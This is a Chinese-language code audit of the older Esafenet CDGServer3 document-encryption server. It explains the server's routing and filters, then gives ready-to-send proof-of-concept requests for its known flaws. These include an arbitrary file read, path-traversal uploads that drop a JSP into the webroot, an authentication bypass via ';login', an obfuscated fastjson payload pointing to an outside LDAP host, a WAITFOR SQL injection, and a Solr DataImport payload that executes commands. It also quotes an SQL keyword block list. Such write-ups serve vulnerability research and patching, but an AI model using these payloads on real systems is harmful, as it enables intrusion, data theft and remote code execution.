## 环境问题
亿赛通主要分为两个大版本，一个是老一代的亿赛通，一个是新一代的亿赛通。此篇代码审计以老一代亿赛通为目标。

![CDGServer3_old](https://github.com/ax1sX/SecurityList/blob/main/images/CDGServer3_old.png)


在Windows下注册的服务名为：CobraDG

默认安装目录为`C:\Program Files (x86)\ESAFENET\CDocGuard Server\tomcat64\webapps\CDGServer3`

## 框架结构

### 路由

整体路由方式包含两种，一种是直接访问在`web.xml`中定义的Servlet。另一种是配置在spring框架下的`@Controller`。

web.xml中定义了很多Servlet，其中`springDispatcherServlet`起到类似拦截器的作用。`/`和`*.do`的路由会由spring来处理。

```xml
	<servlet>
		<servlet-name>springDispatcherServlet</servlet-name>
		<servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
		<init-param>
			<param-name>contextConfigLocation</param-name>
			<param-value>/WEB-INF/spring/spring-mvc.xml</param-value>
		</init-param>
		<load-on-startup>1</load-on-startup>
	</servlet>

	<servlet-mapping>
		<servlet-name>springDispatcherServlet</servlet-name>
		<url-pattern>*.do</url-pattern>
	</servlet-mapping>
	<servlet-mapping>
		<servlet-name>springDispatcherServlet</servlet-name>
		<url-pattern>/</url-pattern>
	</servlet-mapping>
```

跟进`spring-mvc.xml`配置文件，配置了很多组件扫描的包。并在包中扫描所有标有`@Controller`注解的组件。

```xml
	<context:component-scan  base-package="com.esafenet.ta" use-default-filters="false">
		<context:include-filter type="annotation" expression="org.springframework.stereotype.Controller"/>
	</context:component-scan>
```

扫描的包具体如下

```
com.esafenet.ta
com.esafenet.framework
com.esafenet.collect
com.esafenet.log.controller
com.esafenet.es.action
com.esafenet.es.dao
com.esafenet.restful
```



另外， 对于jsp的访问在`spring-mvc.xml`中的定义如下。即可以访问`/sip-jsp/`目录下的jsp文件。

```xml
	<bean
		class="org.springframework.web.servlet.view.InternalResourceViewResolver">
		<property name="viewClass"
			value="org.springframework.web.servlet.view.JstlView" />
		<property name="prefix" value="/sip-jsp/" />
		<property name="suffix" value=".jsp" />
	</bean>
```



### 安全过滤

在web.xml中定义了对于所有`/*`的路由都做了sql的关键字过滤

```xml
<filter>
    <filter-name>SQLFilter</filter-name>
    <filter-class>
			com.esafenet.filter.SQLFilter
		</filter-class>
		<init-param>
			<param-name>sqlKeyword</param-name>
			<param-value>
			waitfor|delay|script|'|exec|insert|select|delete|update|alter|drop|exists|master.|restore|count|%|chr|mid|master|truncate|char|declare|rename|--|or|xp_cmdshell|../..|
			</param-value>
		</init-param>
</filter>
<filter-mapping>
    <filter-name>SQLFilter</filter-name>
		<url-pattern>/*</url-pattern>
</filter-mapping>
```

另外对一些页面做了XSS过滤

```xml
<filter>
    <filter-name>XssSqlFilter</filter-name>
    <filter-class>com.esafenet.filter.XssFilter</filter-class>
</filter>
<filter-mapping>
    <filter-name>XssSqlFilter</filter-name>
    <url-pattern>/index.jsp</url-pattern>
    <url-pattern>/login_pro.jsp</url-pattern>
    <url-pattern>/SystemConfig/*</url-pattern>
    <url-pattern>/logincontroller/*</url-pattern>
    <url-pattern>/ClientAjax/*</url-pattern>
    <url-pattern>/SysConfig.jsp</url-pattern>
</filter-mapping>
```

还会对之前出现过一些漏洞的界面做session的校验

```xml
	<filter>
		<filter-name>SessionValidateFilter</filter-name>
		<filter-class>
		com.esafenet.filter.SessionValidateFilter
		</filter-class>
	</filter>
	<filter-mapping>
		<filter-name>SessionValidateFilter</filter-name>
		<url-pattern>/upgrade/uploadUpgrade.jsp</url-pattern>
		<url-pattern>/policy/upload.jsp</url-pattern>
		<url-pattern>/device/upload.jsp</url-pattern>
		<url-pattern>/patchManagement/upload.jsp</url-pattern>
		<url-pattern>/sip-jsp/*</url-pattern>
		<url-pattern>/system/uploadProcessCheckout.jsp</url-pattern>
		<url-pattern>/testFTP.jsp</url-pattern>
		<url-pattern>/user/importUserFromExcel.jsp</url-pattern>
		<url-pattern>/ukey/uploadUsbKey</url-pattern>
		<url-pattern>/permission/Permission</url-pattern>
		<url-pattern>/logManagement/LogDownLoadService</url-pattern>
		<url-pattern>/document/UploadFileManagerService</url-pattern>
		<url-pattern>/DocInfoAjax</url-pattern>
		<url-pattern>/data/Database</url-pattern>
		<url-pattern>/user/User</url-pattern>
	</filter-mapping>
```



## 历史漏洞



| 漏洞名称                                              | 路径                                                         |
| ----------------------------------------------------- | ------------------------------------------------------------ |
| XStream反序列化漏洞                                   | /CDGServer3/EmailAuditService  （诸多路径存在漏洞）                              |
| ClientAjax任意文件读取漏洞                            | /CDGServer3/ClientAjax                                       |
| DecryptApplicationService2 任意文件上传漏洞           | /CDGServer3/DecryptApplicationService2?fileId=../            |
| importFileType.do 任意文件上传漏洞                    | /CDGServer3/fileType/importFileType.do?flag=syn_user_policy  |
| UploadFileFromClientServiceForClient 任意文件上传漏洞 | /CDGServer3/UploadFileFromClientServiceForClient             |
| UploadFileList 任意文件下载漏洞                       | /CDGServer3/document/UploadFileList;login                    |
| user fastjson远程代码执行漏洞                         | /CDGServer3/sync/user                                        |
| update.jsp sql注入漏洞                                | /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3);WAITFOR%20DELAY%20%270:0:3%27-- |
| dataimport 远程代码执行漏洞                           | /solr/flow/dataimport                                        |





### （1）ClientAjax任意文件读取漏洞

```
POST /CDGServer3/ClientAjax HTTP/1.1
Content-Type: application/x-www-form-urlencoded

command=downclientpak&InstallationPack=../WEB-INF/web.xml&forward=index.jsp
```



### （2）DecryptApplicationService2 任意文件上传漏洞

```
POST /CDGServer3/DecryptApplicationService2?fileId=../../../Program+Files+(x86)/ESAFENET/CDocGuard+Server/tomcat64/webapps/CDGServer3/123.txt HTTP/1.1

This is a Test
```

然后访问

```
GET /CDGServer3/123.txt
```

这是一个非常显而易见的文件上传漏洞。代码如下。关键问题在于`this.model.getDir()`的值是什么。才好构造`fileId`

```java
protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        new CodeDecoder();
        String fileId = request.getParameter("fileId");
        String uploadPath = this.model.getDir() + fileId;
        InputStream iStream = null;
        BufferedInputStream bf = null;
        FileOutputStream fos = null;
        BufferedOutputStream bos = null;

        try {
            log.info("服务器读取客户端传过来的文件流：" + CDGUtil.getTime());
            iStream = request.getInputStream();
            bf = new BufferedInputStream(iStream);
            fos = new FileOutputStream(uploadPath);
            bos = new BufferedOutputStream(fos);
            byte[] bytes = new byte[1024];

            for(int read = bf.read(bytes); read != -1; read = bf.read(bytes)) {
                if (CDGUtil.isGF()) {
                    try {
                        if (read < 1024) {
                            bos.write(bytes, 0, read);
                        } else {
                            bos.write(CDGUtil.encode(bytes), 0, read);
                        }

                        bos.flush();
                    } catch (Exception var18) {
                        var18.printStackTrace();
                    }
                } else {
                    bos.write(bytes, 0, read);
                }
            }
        }
```

跟进`getDir()`方法，路径为`DECRYPT_UPLOAD_PATH`的值。

```
String filePath = Constant.instance.DECRYPT_UPLOAD_PATH;
```

它是jhiberest.jar包中的Constant类中的属性。PropertyManager获取`/WEB-INF/classes/cobradg.properties`文件中标记为`decrypt.upload.path`的值。参考亿赛通的默认安装目录，构造跨目录上传。

```
this.DECRYPT_UPLOAD_PATH = this.FILE_SAVEPATH + PropertyManager.getProperty("/cobradg.properties", "decrypt.upload.path");
```



### （3）importFileType.do 任意文件上传漏洞

POC如下。然后访问`/CDGServer3/error.txt`

```
POST /CDGServer3/fileType/importFileType.do?flag=syn_user_policy HTTP/1.1
Content-Type: multipart/form-data; boundary=0ed800c4d6316b389c56fdbb5619a55f

--0ed800c4d6316b389c56fdbb5619a55f
Content-Disposition: form-data; name="fileshare"; filename="../..\\..\\..\\..\\webapps\\ROOT\\error.txt"

test
--0ed800c4d6316b389c56fdbb5619a55f
```

另外，漏洞测试时会响应200，但报错如下。这是攻击成功的。

```
{"result":"xmlFail","msg":"操作失败"}
```



漏洞位于`com.esafenet.ta.filetypemanage.controller.FileTypeController`

```java
@Controller
@RequestMapping({"/fileType"})
public class FileTypeController extends BasicController {
    @RequestMapping({"/importFileType.do"})
    public void importFileType(@RequestParam(value = "fileshare",required = false) MultipartFile file, HttpServletRequest request, HttpServletResponse response) {
        try {
            this.fileTypeService.importFileType(file);
            this.makeJSONObject(response, AjaxResult.SUCCESS.setResult("ok"));
        } catch (Exception var5) {
            this.makeJSONObject(response, AjaxResult.FAIL().setResult(var5.getMessage()));
        }
    }
}
```

`this.fileTypeService.importFileType`部分代码如下

```java
String xmlName = file.getOriginalFilename();
File xmlfile = new File(this.getFilePath() + File.separator + xmlName);
if (!xmlfile.exists()) {
    xmlfile.mkdirs();
}

file.transferTo(xmlfile);
FileAll fileAll = (FileAll)this.fileTypeDao.jaxbXmlToBean(FileAll.class, xmlfile);
```

`this.getFilePath()`如下

```
private String getFilePath() {
    return System.getProperty("dlpHome") + File.separator + "conf" + File.separator + "xml";
}
```



### （4）UploadFileFromClientServiceForClient 任意文件上传漏洞

POC如下。然后访问`/34fb2afc44ca41aa.jsp`即可。

```
POST /CDGServer3/UploadFileFromClientServiceForClient?
a=CMAMNFHNNEBDPBHMEIHGKDDBFCKMEEEINIHMHLPFPLCFNLDLAHCONNAPDPHMILDIJJNILOBGOOHPNGEKMG
EBBLMCFCMMCAOOJEHLJOIHPGELPOGLPDEFACNAKFMHAALBDMAEBGGODDKHMJACJCBDDACPGFLHIEINLFPJHM
OBDHPMOKBIKHHELFDINOPELHFOFAFGFACGCPFFFGCCCIFHFKBEFFGNGN

test
```

参数值内容解码为

```
fileName=/../../../Program Files (x86)/ESAFENET/CDocGuard
Server/tomcat64/webapps/ROOT/34fb2afc44ca41aa.jsp
```



漏洞代码核心代码如下，获取参数，用`=`号分隔获取参数值，然后用`CDGUtil.decode`进行解码。解码后的内容用`&`分隔。对分隔后的内容判断开头的字符串，然后复制给UploadFileFromClientInfo。实际这块的赋值执行的是个insert的sql语句。并不影响后续的文件上传。所以只需要传入fileName就可以。

```java
protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    String value_code = req.getQueryString();
    value_code = value_code.substring(value_code.indexOf("=") + 1);
    value_decode = CDGUtil.decode(value_code);
    vds = value_decode.split("&");
    for(int var14 = 0; var14 < var13; ++var14) {
        String v = var12[var14];
        if (v.startsWith("fileId")) {
            fileId = v.substring(v.indexOf("=") + 1);
        }else if (v.startsWith("fileName")) {
            fileName = v.substring(v.indexOf("=") + 1);
        }...
    }
    UploadFileFromClientInfo info = new UploadFileFromClientInfo();
    info.setFileName(fileName);
    (new UploadFileFromClientModel()).addUploadFileFromClientInfo(info);
    InputStream is = req.getInputStream();
    byte[] buffer = new byte[1024];
    File file = new File(Constant.instance.UPLOAD_PATH + fileName);
    file.getParentFile().mkdirs();
    file.createNewFile();
    OutputStream os = new FileOutputStream(file);
    int count = 0;
    int value = false;

    int value;
    while((value = is.read(buffer)) != -1) {
        os.write(buffer, 0, value);
        ++count;
        if (count % 10 == 0) {
            os.flush();
        }
    }
}
```





### （5）UploadFileList 任意文件下载漏洞

POC

```
POST /CDGServer3/document/UploadFileList;login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

command=veiwUploadFile&filePath=C:/windows/win.ini&fileName1=11111
```



这个漏洞的路由相对有意思一些。web.xml中定义了该路由对应的处理类是`UploadFileListService`

```xml
<servlet>
   <servlet-name>UploadFileList</servlet-name>
   <servlet-class>
      com.esafenet.servlet.document.UploadFileListService
   </servlet-class>
</servlet>

<servlet-mapping>
   <servlet-name>UploadFileList</servlet-name>
   <url-pattern>/document/UploadFileList</url-pattern>
</servlet-mapping>
```

`UploadFileListService`中没有`doGet`或`doPost`这类方法，因为它本身不是一个Controller。

```
public class UploadFileListService extends WebController {...}
```

查看父类的`WebController`。这里的逻辑较为宽松，也是常见的对关键字login进行鉴权的判断。

```java
public class WebController extends HttpServlet {
    protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        Object[] actionParams = new Object[]{request, response};
        String actionName = request.getParameter("command");
        String fromurl = request.getParameter("fromurl");
        if (this.isRepeat(request) && fromurl != null && !"".equals(fromurl)) { // fromurl为空可以进入else if
            request.getRequestDispatcher(fromurl).forward(request, response);
        } else if (actionParams != null && actionName != null && !"".equals(actionName) && !"null".equals(actionName)) {
            LoginMng loginMng = (LoginMng)request.getSession().getAttribute("loginMng");
            String clienturl = request.getRequestURI();
            if (clienturl != null && (clienturl.indexOf("login") != -1 || clienturl.indexOf("SystemConfig") != -1) || loginMng != null && loginMng.isLogin()) { //如果url中包含login或SystemConfig等，就可以进入if
                try {
                    Method actionFunc = this.getClass().getDeclaredMethod("action" + actionName, SERVICE_PARAMS); // 方法名是 action+actionName
                    actionFunc.setAccessible(true);
                    actionFunc.invoke(this, actionParams); //反射调用方法
                } ...
            } else {
                response.sendRedirect(request.getContextPath() + "/loginExpire.jsp");
            }
        } else {
            this.showMessagePage(request, response, "Error", "Invalid URL: Action not specified");
        }
    }
}
```

之前的组件分析中都提到过，常见的绕过方式包含`url?login=1`或`url;login`等。WebController是核心的请求处理类，根据`command`的值来反射调用方法。方法是`‘action’`+`command`的值。WebController的实现类中有各种Service。定义了诸多方法，例如上面漏洞中调用的`actionVeiwUploadFile`方法。根据WebController方法的反射调用特性，只需要`command`传入`VeiwUploadFile`

```java
public void actionVeiwUploadFile(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
    String page = request.getParameter("page");
    String filePath = new String(request.getParameter("filePath").getBytes("ISO8859_1"), "GBK");
    String fileName1 = new String(request.getParameter("fileName1").getBytes("ISO8859_1"), "GBK");
    String fileName = fileName1.substring(fileName1.lastIndexOf("\\") + 1, fileName1.length());
    if ((new File(filePath)).exists()) {
        CDGUtil.downFile(filePath, response, fileName);
    }
}
```

这里的downFile是典型的文件下载逻辑，并且没有要求对filePath进行加解密。

```java
public static void downFile(String fileWholePath, HttpServletResponse response, String fileName) throws IOException {
        FileInputStream fis = null;
        BufferedInputStream bis = null;
        BufferedOutputStream bos = null;
        ServletOutputStream servletoutputstream = null;

        try {
            fis = new FileInputStream(fileWholePath);
            bis = new BufferedInputStream(fis);
            servletoutputstream = response.getOutputStream();
            bos = new BufferedOutputStream(servletoutputstream);
            String dlName = new String(fileName.getBytes(), "ISO8859_1");
            response.setContentType("application/MIME-CobraDG;charset=\"GB2312\";Content-Disposition:attachment;filename=" + dlName);
            response.setHeader("Content-Disposition", "attachment;filename=" + dlName);
            byte[] abyte1 = new byte[4096];

            int size;
            for(int size = false; (size = bis.read(abyte1)) != -1; abyte1 = new byte[4096]) {
                bos.write(abyte1, 0, size);
            }

            bos.flush();
        } ...
    }
```



### （6）user 远程代码执行漏洞

```
POST /CDGServer3/sync/user
Content-Type: application/json

{
"a": {
"\x40\u0074\u0079\u0070\u0065":
"java.\u006C\u0061\u006E\u0067.\u0043\u006C\u0061\u0073\u0073",
"val":
"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u007
4\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u007
0\u006C"
},
"b": {
"\x40\u0074\u0079\u0070\u0065":
"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u007
4\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u007
0\u006C",
"dataSourceName":
"\u006C\u0064\u0061\u0070\u003A\u002F\u002Fc80d8603d8.ipv6.1433.eu.org",
"autoCommit": true
}
}
```

漏洞位于`com.esafenet.restful.controller.SyncUserAndGroupController`

```java
@Controller
@RequestMapping({"/sync"})
public class SyncUserAndGroupController {
    @RequestMapping({"user"})
    @ResponseBody
    public ReturnObject syncUser(HttpServletRequest request) throws IOException { //同步用户接口
        String userStrs = this.getBody(request);
        List<UserSynBean> users = new ArrayList();
        if (userStrs != null && !"".equals(userStrs)) {
            this.paramUserJson(userStrs, users);
        }
}
```

`getBody`核心代码是`BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream(), "utf-8"));`。读取数据流中的内容然后转乘字符串。接着调用`paramUserJson`方法，而该方法的第一行代码`JSONObject jsonObject = JSON.parseObject(userStrs);`就是调用fastjson对字符串进行解析。而fastjson的版本也存在漏洞。

### （7）update.jsp sql注入漏洞

```
/CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3);WAITFOR%20DELAY%20%270:0:3%27--
```

### （8）dataimport 远程代码执行漏洞

POC如下

```
POST /solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22whoami%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.1383.67 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 
Content-Length: 78

<?xml version="1.0" encoding="UTF-8"?>
    <RDF>
        <item/>
    </RDF>

```

上述解码后的内容如下

```
POST /solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=
<dataConfig>
<dataSource name="streamsrc" type="ContentStreamDataSource" loggerLevel="TRACE" />

  <script><![CDATA[
          function poc(row){
 var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()));

var result = [];

while(true) {
var oneline = bufReader.readLine();
result.push( oneline );
if(!oneline) break;
}

row.put("title",result.join("\n\r"));
return row;

}

]]></script>

<document>
    <entity
        stream="true"
        name="entity1"
        datasource="streamsrc1"
        processor="XPathEntityProcessor"
        rootEntity="true"
        forEach="/RDF/item"
        transformer="script:poc">
             <field column="title" xpath="/RDF/item/title" />
    </entity>
</document>
</dataConfig>
```

这个漏洞实际是CVE-2019-0193 Apache Solr DataImport远程命令执行漏洞在亿赛通中的应用。具体漏洞分析可参考CVE-2019-0193。


